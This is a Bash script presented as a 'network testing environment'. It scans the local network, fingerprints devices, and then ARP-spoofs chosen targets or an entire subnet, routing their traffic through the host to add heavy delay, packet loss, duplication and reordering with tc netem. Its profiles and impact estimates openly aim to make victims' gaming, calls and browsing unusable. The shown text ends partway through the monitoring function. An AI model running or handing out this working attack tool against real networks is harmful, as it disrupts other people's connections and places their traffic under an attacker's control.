#!/bin/bash

# =============================================================================
#
#    ██████   ███   ██    ██ ██      ███████ ███████
#   ██       ████  ███   ██ ██      ██      ██
#   ██   ███ ██ ██ ████  ██ ██      █████   █████
#   ██    ██ ██  ███ ██ ██ ██      ██      ██
#    ██████  ██   ███  ████ ███████ ███████ ███████
#
#    GNU LAN Network Testing Environment
#    Version 6.1
#
# =============================================================================
#  Usage: ./gnulte [OPTIONS]
#  
#  TARGETING:
#    -t, --target IP       Target IP (or multiple: IP1,IP2,IP3)
#    -m, --mac MAC         Target by MAC address
#    -r, --range CIDR      Target entire subnet (e.g., 192.168.1.0/24)
#    -w, --whitelist IP    Exclude IP(s) from range attack (comma-separated)
#
#  PARAMETERS:
#    -l, --latency MS      Base delay in ms (default: 2000)
#    -j, --jitter MS       Random variation in ms (default: 500)
#    -p, --loss PERCENT    Packet drop % (default: 0)
#    -d, --duplicate %     Duplicate packets % (default: 0)
#    -e, --reorder %       Out-of-order packets % (default: 0)
#    --profile NAME        Preset: gaming, streaming, voip, web, extreme
#    --random              Randomly vary all parameters
#
#  ADVANCED:
#    --duration SECONDS    Auto-stop after N seconds
#    --export CSV          Save ping results to CSV
#    --scan                Deep scan (ports, OS, hostname)
#
#  OUTPUT:
#    --log-mode MODE       normal | simple | quiet
#    --config              Edit configuration file
#    -h, --help            Show this help
# =============================================================================

# -----------------------------------------------------------------------------
# CONFIGURATION
# -----------------------------------------------------------------------------
CONFIG_FILE="$HOME/.gnulte.conf"
LOG_MODE="normal"
DURATION=0
RANDOM_MODE=false
EXPORT_CSV=""
SCAN_MODE=false
WHITELIST=()
TARGETS=()

# Default colours (ANSI)
COLOR_HEADER="\033[1;36m"
COLOR_INFO="\033[0;34m"
COLOR_OK="\033[0;32m"
COLOR_WARN="\033[1;33m"
COLOR_ERR="\033[0;31m"
COLOR_CMD="\033[1;33m"
COLOR_TARGET="\033[0;36m"
COLOR_RESET="\033[0m"
COLOR_DIM="\033[2m"
COLOR_BOLD="\033[1m"

# Default settings
DEFAULT_LATENCY=2000
DEFAULT_JITTER=500
DEFAULT_LOSS=0
DEFAULT_DUPLICATE=0
DEFAULT_REORDER=0
DEFAULT_INTERFACE=""
DEFAULT_GATEWAY=""
DEFAULT_DURATION=0
DEFAULT_LOG_MODE="normal"

# Load config if exists
if [ -f "$CONFIG_FILE" ]; then
    source "$CONFIG_FILE"
fi

# -----------------------------------------------------------------------------
# HEADER (BIGGER)
# -----------------------------------------------------------------------------
show_header() {
    echo -e "${COLOR_HEADER}"
    echo '  ██████╗ ███╗   ██╗██╗   ██╗██╗  ████████╗███████╗'
    echo ' ██╔════╝ ████╗  ██║██║   ██║██║  ╚══██╔══╝██╔════╝'
    echo ' ██║  ███╗██╔██╗ ██║██║   ██║██║     ██║   █████╗  '
    echo ' ██║   ██║██║╚██╗██║██║   ██║██║     ██║   ██╔══╝  '
    echo ' ╚██████╔╝██║ ╚████║╚██████╔╝███████╗██║   ███████╗'
    echo '  ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝   ╚══════╝'
    echo -e "${COLOR_RESET}"
    echo -e "${COLOR_BOLD}${COLOR_INFO}GNU LAN Network Testing Environment${COLOR_RESET}"
    echo -e "${COLOR_DIM}Version 6.1${COLOR_RESET}"
    echo ""
}
# -----------------------------------------------------------------------------
# PROFILES
# -----------------------------------------------------------------------------
PROFILE_DESCRIPTIONS=(
    "gaming    : 1500ms latency, 300ms jitter, 2% loss – unplayable lag"
    "streaming : 2500ms latency, 500ms jitter, 5% loss – constant buffering"
    "voip      : 3000ms latency, 200ms jitter, 5% reorder – broken calls"
    "web       : 2000ms latency, 400ms jitter, 3% loss – slow browsing"
    "extreme   : 5000ms latency, 1000ms jitter, 10% loss, dup/reorder – total destruction"
)

load_profile() {
    case "$1" in
        gaming)
            LATENCY=1500; JITTER=300; LOSS=2; DUPLICATE=0; REORDER=0
            log_info "Profile: ${COLOR_TARGET}gaming${COLOR_RESET} – unplayable lag"
            ;;
        streaming)
            LATENCY=2500; JITTER=500; LOSS=5; DUPLICATE=0; REORDER=0
            log_info "Profile: ${COLOR_TARGET}streaming${COLOR_RESET} – constant buffering"
            ;;
        voip)
            LATENCY=3000; JITTER=200; LOSS=0; DUPLICATE=0; REORDER=5
            log_info "Profile: ${COLOR_TARGET}voip${COLOR_RESET} – broken calls"
            ;;
        web)
            LATENCY=2000; JITTER=400; LOSS=3; DUPLICATE=0; REORDER=0
            log_info "Profile: ${COLOR_TARGET}web${COLOR_RESET} – slow browsing"
            ;;
        extreme)
            LATENCY=5000; JITTER=1000; LOSS=10; DUPLICATE=5; REORDER=5
            log_info "Profile: ${COLOR_TARGET}extreme${COLOR_RESET} – total destruction"
            ;;
        *)
            log_err "Unknown profile: $1"
            log_info "Available: gaming, streaming, voip, web, extreme"
            return 1
            ;;
    esac
    return 0
}

show_profiles() {
    echo ""
    echo -e "${COLOR_BOLD}Available Profiles:${COLOR_RESET}"
    echo "  ──────────────────────────────────────────────────────────────────────"
    for p in "${PROFILE_DESCRIPTIONS[@]}"; do
        echo "    $p"
    done
    echo "  ──────────────────────────────────────────────────────────────────────"
    echo -e "${COLOR_DIM}Enter profile name or 'manual' to configure manually.${COLOR_RESET}"
    echo -e "${COLOR_DIM}Press Enter to skip and configure manually.${COLOR_RESET}"
    echo ""
}

# -----------------------------------------------------------------------------
# FUNCTIONS
# -----------------------------------------------------------------------------
log_info() {
    [ "$LOG_MODE" = "quiet" ] && return
    echo -e "${COLOR_INFO}[INFO]${COLOR_RESET} $1"
}

log_ok() {
    [ "$LOG_MODE" = "quiet" ] && return
    echo -e "${COLOR_OK}[OK]${COLOR_RESET} $1"
}

log_warn() {
    [ "$LOG_MODE" = "quiet" ] && return
    echo -e "${COLOR_WARN}[WARN]${COLOR_RESET} $1"
}

log_err() {
    echo -e "${COLOR_ERR}[ERROR]${COLOR_RESET} $1" >&2
}

log_cmd() {
    [ "$LOG_MODE" = "simple" ] || [ "$LOG_MODE" = "quiet" ] && return
    echo -e "${COLOR_DIM}[EXEC]${COLOR_RESET} ${COLOR_CMD}$1${COLOR_RESET}"
}

log_target() {
    [ "$LOG_MODE" = "quiet" ] && return
    echo -e "${COLOR_TARGET}[TARGET]${COLOR_RESET} $1"
}

log_section() {
    [ "$LOG_MODE" = "quiet" ] && return
    echo ""
    echo -e "${COLOR_BOLD}${COLOR_INFO}─── $1 ───${COLOR_RESET}"
}

show_help() {
    cat << EOF
${COLOR_HEADER}GNULTE${COLOR_RESET} – ${COLOR_DIM}GNU LAN Network Testing Environment v6.1${COLOR_RESET}

${COLOR_BOLD}TARGETING:${COLOR_RESET}
  -t, --target IP       Target IP (or multiple: IP1,IP2,IP3)
  -m, --mac MAC         Target by MAC address
  -r, --range CIDR      Target entire subnet (e.g., 192.168.1.0/24)
  -w, --whitelist IP    Exclude IP(s) from range attack (comma-separated)

${COLOR_BOLD}PARAMETERS:${COLOR_RESET}
  -l, --latency MS      Base delay in ms (default: $DEFAULT_LATENCY)
  -j, --jitter MS       Random variation in ms (default: $DEFAULT_JITTER)
  -p, --loss PERCENT    Packet drop %% (default: $DEFAULT_LOSS)
  -d, --duplicate %%    Duplicate packets %% (default: $DEFAULT_DUPLICATE)
  -e, --reorder %%      Out-of-order packets %% (default: $DEFAULT_REORDER)
  --profile NAME        Preset: gaming, streaming, voip, web, extreme
  --random              Randomly vary all parameters

${COLOR_BOLD}ADVANCED:${COLOR_RESET}
  --duration SECONDS    Auto-stop after N seconds
  --export CSV          Save ping results to CSV
  --scan                Deep scan (ports, OS, hostname)

${COLOR_BOLD}OUTPUT:${COLOR_RESET}
  --log-mode MODE       normal | simple | quiet
  --config              Edit configuration file
  -h, --help            Show this help

${COLOR_BOLD}EXAMPLES:${COLOR_RESET}
  gnulte -t 192.168.1.100 -l 3000 -j 500
  gnulte --profile gaming -t 192.168.1.100 --duration 60
  gnulte --range 192.168.1.0/24 --whitelist 192.168.1.1,192.168.1.100
  gnulte -t 192.168.1.100,192.168.1.101 -l 2000 --random
  gnulte --scan -t 192.168.1.100

EOF
}

# -----------------------------------------------------------------------------
# DEVICE IDENTIFICATION
# -----------------------------------------------------------------------------
identify_device() {
    local ip=$1
    local vendor=$2
    local hostname=""
    local device_type="Unknown"
    local ports=""

    hostname=$(host "$ip" 2>/dev/null | head -1 | awk '{print $5}' | cut -d. -f1)
    if [ -z "$hostname" ] || [ "$hostname" = "localhost" ] || [ "$hostname" = "$ip" ]; then
        hostname="Unknown"
    fi

    for p in 22 80 443 445 554 5555 8008 8080 8443 9000 32400; do
        timeout 1 bash -c "echo >/dev/tcp/$ip/$p" 2>/dev/null && ports="${ports}${p},"
    done
    ports=$(echo "$ports" | sed 's/,$//')

    case "$vendor" in
        *Apple*|*apple*)         device_type="Apple" ;;
        *Xiaomi*|*xiaomi*)       device_type="Xiaomi" ;;
        *Intel*|*intel*)         device_type="PC" ;;
        *Frontiir*)              device_type="Router" ;;
        *Samsung*|*samsung*)     device_type="Samsung" ;;
        *Google*|*google*)       device_type="Google" ;;
        *BILIAN*)                device_type="IoT" ;;
        *Raspberry*|*raspberry*) device_type="Pi" ;;
        *TP-Link*)               device_type="TP-Link" ;;
        *Netgear*)               device_type="Netgear" ;;
        *Cisco*)                 device_type="Cisco" ;;
        *Ubiquiti*)              device_type="Ubiquiti" ;;
        *Sony*|*sony*)           device_type="Sony" ;;
        *LG*|*lg*)               device_type="LG" ;;
        *Nvidia*|*nvidia*)       device_type="NVIDIA" ;;
        *Amazon*|*amazon*)       device_type="Amazon" ;;
        *Roku*|*roku*)           device_type="Roku" ;;
        *Philips*|*philips*)     device_type="Philips" ;;
        *)                       device_type="Unknown" ;;
    esac

    [[ "$ports" == *"22"* ]] && device_type="$device_type+SSH"
    [[ "$ports" == *"80"* ]] && device_type="$device_type+HTTP"
    [[ "$ports" == *"443"* ]] && device_type="$device_type+HTTPS"
    [[ "$ports" == *"445"* ]] && device_type="$device_type+SMB"
    [[ "$ports" == *"554"* ]] && device_type="$device_type+RTSP(Camera)"
    [[ "$ports" == *"5555"* ]] && device_type="$device_type+ADB(Android)"
    [[ "$ports" == *"8008"* ]] || [[ "$ports" == *"8009"* ]] && device_type="$device_type+Cast(TV)"
    [[ "$ports" == *"32400"* ]] && device_type="$device_type+Plex"

    case "$hostname" in
        *tv*|*TV*|*television*|*bravia*|*androidtv*)  device_type="Android TV" ;;
        *phone*|*Phone*|*iphone*|*iPhone*)            device_type="Phone" ;;
        *laptop*|*Laptop*|*pc*|*PC*|*desktop*)        device_type="Computer" ;;
        *server*|*Server*|*nas*|*NAS*)                device_type="Server" ;;
        *printer*|*Printer*)                          device_type="Printer" ;;
        *camera*|*Camera*|*cam*)                      device_type="Camera" ;;
        *speaker*|*Speaker*|*echo*|*googlehome*)      device_type="Speaker" ;;
        *router*|*Router*|*gateway*|*firewall*)       device_type="Router" ;;
        *chromecast*|*Chromecast*)                    device_type="Chromecast" ;;
        *firestick*|*Firestick*|*firetv*)             device_type="FireTV" ;;
    esac

    echo "$hostname|$device_type|$ports"
}

# -----------------------------------------------------------------------------
# DEEP SCAN
# -----------------------------------------------------------------------------
deep_scan() {
    local ip=$1
    log_info "Deep scanning $ip..."
    
    if ! command -v nmap &>/dev/null; then
        log_warn "nmap not installed. Install with: sudo apt install nmap (or pacman -S nmap)"
        log_info "Basic scan only:"
        identify_device "$ip" "Unknown"
        return
    fi
    
    OS=$(nmap -O -T4 "$ip" 2>/dev/null | grep "OS details" | cut -d: -f2 | head -1 | sed 's/^ //')
    [ -z "$OS" ] && OS="Unknown"
    
    PORTS=$(nmap -p 22,23,25,53,80,110,135,139,143,443,445,554,993,995,1433,3306,3389,5432,5555,5900,6379,8008,8080,8443,9000,32400 --open -T4 "$ip" 2>/dev/null | grep "open" | awk '{print $1}' | tr '\n' ',' | sed 's/,$//' | sed 's/\/tcp//g')
    [ -z "$PORTS" ] && PORTS="None"
    
    HOSTNAME=$(host "$ip" 2>/dev/null | head -1 | awk '{print $5}' | cut -d. -f1)
    [ -z "$HOSTNAME" ] && HOSTNAME="Unknown"
    
    echo ""
    echo "  ${COLOR_BOLD}IP:${COLOR_RESET}        $ip"
    echo "  ${COLOR_BOLD}Hostname:${COLOR_RESET}   $HOSTNAME"
    echo "  ${COLOR_BOLD}OS:${COLOR_RESET}         $OS"
    echo "  ${COLOR_BOLD}Open Ports:${COLOR_RESET} $PORTS"
    echo ""
}

# -----------------------------------------------------------------------------
# CONFIG EDITOR
# -----------------------------------------------------------------------------
edit_config() {
    if [ ! -f "$CONFIG_FILE" ]; then
        cat > "$CONFIG_FILE" << 'EOF'
# =============================================================================
# GNULTE CONFIGURATION
# GNU LAN Network Testing Environment
# =============================================================================
# Edit these values to customise colours and defaults.

# -----------------------------------------------------------------------------
# COLOUR SETTINGS (ANSI codes)
# -----------------------------------------------------------------------------
COLOR_HEADER="\033[1;36m"    # Header (cyan bold)
COLOR_INFO="\033[0;34m"      # Info messages (blue)
COLOR_OK="\033[0;32m"        # Success messages (green)
COLOR_WARN="\033[1;33m"      # Warnings (yellow)
COLOR_ERR="\033[0;31m"       # Errors (red)
COLOR_CMD="\033[1;33m"       # Command display (bold yellow)
COLOR_TARGET="\033[0;36m"    # Target IP display (cyan)
COLOR_RESET="\033[0m"        # Reset
COLOR_DIM="\033[2m"          # Dim text
COLOR_BOLD="\033[1m"         # Bold text

# -----------------------------------------------------------------------------
# DEFAULT SETTINGS
# -----------------------------------------------------------------------------
DEFAULT_LATENCY=2000
DEFAULT_JITTER=500
DEFAULT_LOSS=0
DEFAULT_DUPLICATE=0
DEFAULT_REORDER=0
DEFAULT_INTERFACE=""
DEFAULT_GATEWAY=""
DEFAULT_DURATION=0
DEFAULT_LOG_MODE="normal"
EOF
        log_ok "Created default configuration: $CONFIG_FILE"
    fi
    
    if [ -n "$EDITOR" ]; then
        $EDITOR "$CONFIG_FILE"
    else
        nano "$CONFIG_FILE"
    fi
    exit 0
}

# -----------------------------------------------------------------------------
# DETECT NETWORK
# -----------------------------------------------------------------------------
detect_network() {
    log_info "Detecting network configuration..."
    
    INTERFACE="$DEFAULT_INTERFACE"
    if [ -z "$INTERFACE" ]; then
        INTERFACE=$(ip route | grep default | awk '{print $5}' | head -1)
    fi
    
    if [ -z "$INTERFACE" ]; then
        log_err "Could not detect network interface."
        exit 1
    fi
    
    GATEWAY="$DEFAULT_GATEWAY"
    if [ -z "$GATEWAY" ]; then
        GATEWAY=$(ip route | grep default | awk '{print $3}' | head -1)
    fi
    
    if [ -z "$GATEWAY" ]; then
        log_err "Could not detect gateway."
        exit 1
    fi
    
    MY_IP=$(ip -4 addr show "$INTERFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
    if [ -z "$MY_IP" ]; then
        log_err "Could not determine IP for interface $INTERFACE"
        exit 1
    fi
    
    log_ok "Interface: $INTERFACE"
    log_ok "Gateway: $GATEWAY"
    log_ok "Your IP: $MY_IP"
    echo ""
}

# -----------------------------------------------------------------------------
# SCAN DEVICES (FIXED – runs sudo properly)
# -----------------------------------------------------------------------------
scan_devices() {
    log_info "Scanning for active devices..."
    
    if ! command -v arp-scan &>/dev/null; then
        log_err "arp-scan not found. Install with: sudo apt install arp-scan (or pacman -S arp-scan)"
        exit 1
    fi
    
    # Run arp-scan with sudo – this will prompt for password if needed
    ARP_OUTPUT=$(sudo arp-scan --local 2>/dev/null)
    if [ -z "$ARP_OUTPUT" ]; then
        log_err "arp-scan returned no output. Check permissions."
        exit 1
    fi
    
    DEVICES=$(echo "$ARP_OUTPUT" | grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" | grep -v "Starting" | grep -v "packets received")
    
    IP_LIST=()
    MAC_LIST=()
    VENDOR_LIST=()
    HOSTNAME_LIST=()
    TYPE_LIST=()
    
    while IFS= read -r line; do
        IP=$(echo "$line" | awk '{print $1}')
        MAC=$(echo "$line" | awk '{print $2}')
        VENDOR=$(echo "$line" | cut -d' ' -f3-)
        if [[ "$IP" != "$MY_IP" ]]; then
            IP_LIST+=("$IP")
            MAC_LIST+=("$MAC")
            VENDOR_LIST+=("$VENDOR")
            
            IDENT=$(identify_device "$IP" "$VENDOR")
            HOSTNAME=$(echo "$IDENT" | cut -d'|' -f1)
            DEV_TYPE=$(echo "$IDENT" | cut -d'|' -f2)
            HOSTNAME_LIST+=("$HOSTNAME")
            TYPE_LIST+=("$DEV_TYPE")
        fi
    done <<< "$DEVICES"
    
    if [ ${#IP_LIST[@]} -eq 0 ]; then
        log_err "No other devices found on the network."
        exit 1
    fi
    
    log_ok "Found ${#IP_LIST[@]} device(s)"
    echo ""
}

# -----------------------------------------------------------------------------
# DISPLAY DEVICES
# -----------------------------------------------------------------------------
display_devices() {
    echo -e "${COLOR_BOLD}Device List:${COLOR_RESET}"
    echo -e "${COLOR_DIM}  #  IP Address        Hostname         Type         Vendor${COLOR_RESET}"
    echo "  ──────────────────────────────────────────────────────────────────────"
    for i in "${!IP_LIST[@]}"; do
        HOST_DISPLAY="${HOSTNAME_LIST[$i]:0:16}"
        TYPE_DISPLAY="${TYPE_LIST[$i]:0:12}"
        VENDOR_DISPLAY="${VENDOR_LIST[$i]:0:18}"
        printf "  ${COLOR_WARN}%-2d${COLOR_RESET} ${COLOR_TARGET}%-16s${COLOR_RESET} ${COLOR_DIM}%-16s${COLOR_RESET} %-12s %s\n" \
            "$((i+1))" "${IP_LIST[$i]}" "$HOST_DISPLAY" "$TYPE_DISPLAY" "$VENDOR_DISPLAY"
    done
    echo "  ──────────────────────────────────────────────────────────────────────"
    echo -e "  ${COLOR_DIM}r = Range attack (all devices) | 0 = Exit${COLOR_RESET}"
    echo -e "  ${COLOR_DIM}Example: '1,2,3' for multiple, 'r' for all${COLOR_RESET}"
    echo ""
}

# -----------------------------------------------------------------------------
# SELECT TARGETS
# -----------------------------------------------------------------------------
select_targets() {
    while true; do
        echo -e "${COLOR_DIM}Enter device numbers (comma-separated, e.g., 1,2,3) or 'r' for all:${COLOR_RESET}"
        read -p "Selection: " SELECTION
        
        if [[ "$SELECTION" == "0" ]]; then
            log_info "Exiting."
            exit 0
        fi
        
        if [[ "$SELECTION" == "r" ]] || [[ "$SELECTION" == "R" ]]; then
            for i in "${!IP_LIST[@]}"; do
                TARGETS+=("${IP_LIST[$i]}")
            done
            log_target "Selected ALL ${#TARGETS[@]} devices"
            break
        fi
        
        IFS=',' read -ra SELECTIONS <<< "$SELECTION"
        VALID=true
        for SEL in "${SELECTIONS[@]}"; do
            if [[ "$SEL" =~ ^[0-9]+$ ]] && [ "$SEL" -ge 1 ] && [ "$SEL" -le "${#IP_LIST[@]}" ]; then
                INDEX=$((SEL-1))
                TARGETS+=("${IP_LIST[$INDEX]}")
            else
                VALID=false
                log_warn "Invalid selection: $SEL"
                break
            fi
        done
        
        if [ "$VALID" = true ] && [ ${#TARGETS[@]} -gt 0 ]; then
            echo ""
            log_target "Selected ${#TARGETS[@]} device(s):"
            for T in "${TARGETS[@]}"; do
                echo "    - $T"
            done
            break
        else
            TARGETS=()
            log_warn "Invalid selection. Try again."
        fi
    done
    echo ""
}

# -----------------------------------------------------------------------------
# IMPACT ESTIMATION
# -----------------------------------------------------------------------------
estimate_impact() {
    local latency=$1
    local jitter=$2
    local loss=$3
    local duplicate=$4
    local reorder=$5
    
    echo ""
    echo -e "${COLOR_BOLD}${COLOR_INFO}Impact Estimate:${COLOR_RESET}"
    echo -e "${COLOR_DIM}This shows how your settings will affect the target.${COLOR_RESET}"
    echo ""

    if [ "$latency" -le 500 ]; then
        impact_latency="Low (noticeable delay)"
        status_latency="${COLOR_OK}●${COLOR_RESET}"
    elif [ "$latency" -le 1500 ]; then
        impact_latency="Medium (annoying lag)"
        status_latency="${COLOR_WARN}●${COLOR_RESET}"
    elif [ "$latency" -le 3000 ]; then
        impact_latency="High (unusable for real-time)"
        status_latency="${COLOR_WARN}●${COLOR_RESET}"
    else
        impact_latency="Extreme (total breakdown)"
        status_latency="${COLOR_ERR}●${COLOR_RESET}"
    fi

    if [ "$jitter" -le 100 ]; then
        impact_jitter="Low (stable)"
        status_jitter="${COLOR_OK}●${COLOR_RESET}"
    elif [ "$jitter" -le 300 ]; then
        impact_jitter="Medium (noticeable variation)"
        status_jitter="${COLOR_WARN}●${COLOR_RESET}"
    elif [ "$jitter" -le 800 ]; then
        impact_jitter="High (unstable connection)"
        status_jitter="${COLOR_WARN}●${COLOR_RESET}"
    else
        impact_jitter="Extreme (chaotic)"
        status_jitter="${COLOR_ERR}●${COLOR_RESET}"
    fi

    if [ "$loss" -le 1 ]; then
        impact_loss="Low (retransmissions)"
        status_loss="${COLOR_OK}●${COLOR_RESET}"
    elif [ "$loss" -le 5 ]; then
        impact_loss="Medium (noticeable drops)"
        status_loss="${COLOR_WARN}●${COLOR_RESET}"
    elif [ "$loss" -le 15 ]; then
        impact_loss="High (frequent disconnects)"
        status_loss="${COLOR_WARN}●${COLOR_RESET}"
    else
        impact_loss="Extreme (nearly offline)"
        status_loss="${COLOR_ERR}●${COLOR_RESET}"
    fi

    local score=$((latency/1000 + jitter/100 + loss*2 + duplicate*2 + reorder))
    if [ "$score" -le 5 ]; then
        overall="LOW — Target will barely notice"
        overall_color="${COLOR_OK}"
    elif [ "$score" -le 12 ]; then
        overall="MODERATE — Target will complain about slow internet"
        overall_color="${COLOR_WARN}"
    elif [ "$score" -le 25 ]; then
        overall="HIGH — Target's connection will be severely degraded"
        overall_color="${COLOR_ERR}"
    else
        overall="EXTREME — Target will think their internet is completely broken"
        overall_color="${COLOR_ERR}"
    fi

    echo "  ${COLOR_BOLD}Parameter     Value    Impact${COLOR_RESET}"
    echo "  ────────────────────────────────────────────────────────"
    echo -e "  Latency      ${latency}ms   ${status_latency} ${impact_latency}"
    echo -e "  Jitter       ${jitter}ms   ${status_jitter} ${impact_jitter}"
    echo -e "  Loss         ${loss}%     ${status_loss} ${impact_loss}"
    [ "$duplicate" -gt 0 ] && echo -e "  Duplication  ${duplicate}%   ${COLOR_WARN}●${COLOR_RESET} Extra packets (confuses TCP)"
    [ "$reorder" -gt 0 ] && echo -e "  Reordering   ${reorder}%   ${COLOR_WARN}●${COLOR_RESET} Out-of-order packets"
    echo "  ────────────────────────────────────────────────────────"
    echo -e "  ${COLOR_BOLD}Overall:${COLOR_RESET} ${overall_color}${overall}${COLOR_RESET}"
    echo ""
    echo -e "${COLOR_DIM}Affected services:${COLOR_RESET}"
    local services=""
    [ "$latency" -gt 500 ] && services="$services, Web browsing"
    [ "$latency" -gt 800 ] && services="$services, Video streaming"
    [ "$loss" -gt 2 ] && services="$services, VoIP calls"
    [ "$latency" -gt 1000 ] && services="$services, Online gaming"
    [ "$jitter" -gt 200 ] && services="$services, Video conferencing"
    [ "$loss" -gt 5 ] && services="$services, File transfers"
    [ "$latency" -gt 2000 ] && services="$services, SSH/Remote access"
    services="${services#, }"
    [ -z "$services" ] && services="Low impact — most services unaffected"
    echo "  $services"
    echo ""
}

# -----------------------------------------------------------------------------
# CONFIGURE PARAMETERS (with profile selection)
# -----------------------------------------------------------------------------
configure_params() {
    echo ""
    echo -e "${COLOR_BOLD}${COLOR_INFO}Parameter Configuration:${COLOR_RESET}"
    echo -e "${COLOR_DIM}Press Enter to use default values.${COLOR_RESET}"
    echo ""
    
    show_profiles
    read -p "Profile (or 'manual'): " PROFILE_INPUT
    
    if [ -n "$PROFILE_INPUT" ] && [ "$PROFILE_INPUT" != "manual" ]; then
        if load_profile "$PROFILE_INPUT"; then
            echo ""
            log_info "Using profile: ${COLOR_TARGET}$PROFILE_INPUT${COLOR_RESET}"
            echo ""
            echo -e "${COLOR_DIM}You can still tweak individual values below (press Enter to keep profile values).${COLOR_RESET}"
            echo ""
        else
            log_warn "Invalid profile. Proceeding with manual configuration."
            PROFILE_INPUT="manual"
        fi
    fi
    
    if [ -z "$PROFILE_INPUT" ] || [ "$PROFILE_INPUT" = "manual" ]; then
        echo -e "${COLOR_DIM}Latency: The base delay added to every packet.${COLOR_RESET}"
        echo -e "${COLOR_DIM}  - 500ms: Noticeable delay${COLOR_RESET}"
        echo -e "${COLOR_DIM}  - 2000ms: Significant lag${COLOR_RESET}"
        echo -e "${COLOR_DIM}  - 5000ms: Total breakdown${COLOR_RESET}"
        read -p "Latency (ms) [$DEFAULT_LATENCY]: " LATENCY_INPUT
        [ -n "$LATENCY_INPUT" ] && LATENCY="$LATENCY_INPUT"

        echo ""
        echo -e "${COLOR_DIM}Jitter: Random variation in delay.${COLOR_RESET}"
        echo -e "${COLOR_DIM}  - 100ms: Stable connection${COLOR_RESET}"
        echo -e "${COLOR_DIM}  - 500ms: Unstable, video stuttering${COLOR_RESET}"
        echo -e "${COLOR_DIM}  - 1000ms: Chaotic, random lag spikes${COLOR_RESET}"
        read -p "Jitter (ms) [$DEFAULT_JITTER]: " JITTER_INPUT
        [ -n "$JITTER_INPUT" ] && JITTER="$JITTER_INPUT"

        echo ""
        echo -e "${COLOR_DIM}Loss: Percentage of packets dropped.${COLOR_RESET}"
        echo -e "${COLOR_DIM}  - 1-2%: Retransmissions, slight slowdown${COLOR_RESET}"
        echo -e "${COLOR_DIM}  - 5-10%: Frequent disconnects${COLOR_RESET}"
        echo -e "${COLOR_DIM}  - 15%+: Nearly offline${COLOR_RESET}"
        read -p "Loss (%) [$DEFAULT_LOSS]: " LOSS_INPUT
        [ -n "$LOSS_INPUT" ] && LOSS="$LOSS_INPUT"

        echo ""
        echo -e "${COLOR_DIM}Duplicate: Duplicate packets (confuses TCP).${COLOR_RESET}"
        echo -e "${COLOR_DIM}  - Makes downloads slower and weird${COLOR_RESET}"
        read -p "Duplicate (%) [$DEFAULT_DUPLICATE]: " DUPLICATE_INPUT
        [ -n "$DUPLICATE_INPUT" ] && DUPLICATE="$DUPLICATE_INPUT"

        echo ""
        echo -e "${COLOR_DIM}Reorder: Out-of-order packets.${COLOR_RESET}"
        echo -e "${COLOR_DIM}  - Breaks TCP's flow control${COLOR_RESET}"
        read -p "Reorder (%) [$DEFAULT_REORDER]: " REORDER_INPUT
        [ -n "$REORDER_INPUT" ] && REORDER="$REORDER_INPUT"
    fi

    if [ "$DURATION" -eq 0 ]; then
        echo ""
        echo -e "${COLOR_DIM}Duration: Auto-stop after N seconds.${COLOR_RESET}"
        echo -e "${COLOR_DIM}  - Useful for testing or saving battery${COLOR_RESET}"
        read -p "Duration (seconds) [unlimited]: " DURATION_INPUT
        DURATION=${DURATION_INPUT:-0}
    fi

    echo ""
    log_info "Configuration:"
    log_info "  Targets  : ${#TARGETS[@]} device(s)"
    log_info "  Latency  : ${LATENCY}ms"
    log_info "  Jitter   : ${JITTER}ms"
    log_info "  Loss     : ${LOSS}%"
    log_info "  Dup      : ${DUPLICATE}%"
    log_info "  Reorder  : ${REORDER}%"
    [ "$DURATION" -gt 0 ] && log_info "  Duration : ${DURATION}s"
    [ "$RANDOM_MODE" = true ] && log_info "  Mode     : ${COLOR_WARN}RANDOM${COLOR_RESET}"
    echo ""

    estimate_impact "$LATENCY" "$JITTER" "$LOSS" "$DUPLICATE" "$REORDER"

    read -p "Start? (y/n): " CONFIRM
    if [[ ! "$CONFIRM" =~ ^[Yy]$ ]]; then
        log_info "Aborted."
        exit 0
    fi
}

# -----------------------------------------------------------------------------
# EXECUTE (FIXED – runs arpspoof properly with sudo)
# -----------------------------------------------------------------------------
execute() {
    log_section "EXECUTING"
    
    log_cmd "sysctl -w net.ipv4.ip_forward=1"
    sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1
    log_ok "IP forwarding enabled"
    
    # Check if arpspoof is installed
    if ! command -v arpspoof &>/dev/null; then
        log_err "arpspoof not found. Install with: sudo apt install dsniff"
        exit 1
    fi
    
    for TARGET_IP in "${TARGETS[@]}"; do
        log_info "Starting attack on $TARGET_IP..."
        
        log_cmd "arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY"
        sudo arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" 2>/dev/null &
        SPOOF1_PIDS+=($!)
        log_ok "Spoof $TARGET_IP -> $GATEWAY (PID ${SPOOF1_PIDS[-1]})"
        
        log_cmd "arpspoof -i $INTERFACE -t $GATEWAY $TARGET_IP"
        sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" 2>/dev/null &
        SPOOF2_PIDS+=($!)
        log_ok "Spoof $GATEWAY -> $TARGET_IP (PID ${SPOOF2_PIDS[-1]})"
    done
    
    echo ""
    sleep 2
    
    log_info "Applying traffic control..."
    TC_CMD="tc qdisc add dev $INTERFACE root netem"
    TC_CMD="$TC_CMD delay ${LATENCY}ms ${JITTER}ms"
    [ "$LOSS" -gt 0 ] && TC_CMD="$TC_CMD loss ${LOSS}%"
    [ "$DUPLICATE" -gt 0 ] && TC_CMD="$TC_CMD duplicate ${DUPLICATE}%"
    [ "$REORDER" -gt 0 ] && TC_CMD="$TC_CMD reorder ${REORDER}% gap 5"
    
    log_cmd "$TC_CMD"
    sudo $TC_CMD 2>/dev/null
    
    if [ $? -eq 0 ]; then
        log_ok "Traffic control applied to ALL targets"
    else
        log_err "Failed to apply traffic control"
        cleanup
        exit 1
    fi
    echo ""
}

# -----------------------------------------------------------------------------
# MONITOR
# -----------------------------------------------------------------------------
monitor() {
    log_section "MONITORING"
    echo -e "${COLOR_DIM}Press ${COLOR_BOLD}Ctrl+C${COLOR_RESET}${COLOR_DIM} to stop${COLOR_RESET}"
    [ "$DURATION" -gt 0 ] && echo -e "${COLOR_DIM}Auto-stop in ${DURATION} seconds${COLOR_RESET}"
    [ "$RANDOM_MODE" = true ] && echo -e "${COLOR_WARN}Random mode active – parameters will vary${COLOR_RESET}"
    echo ""
    
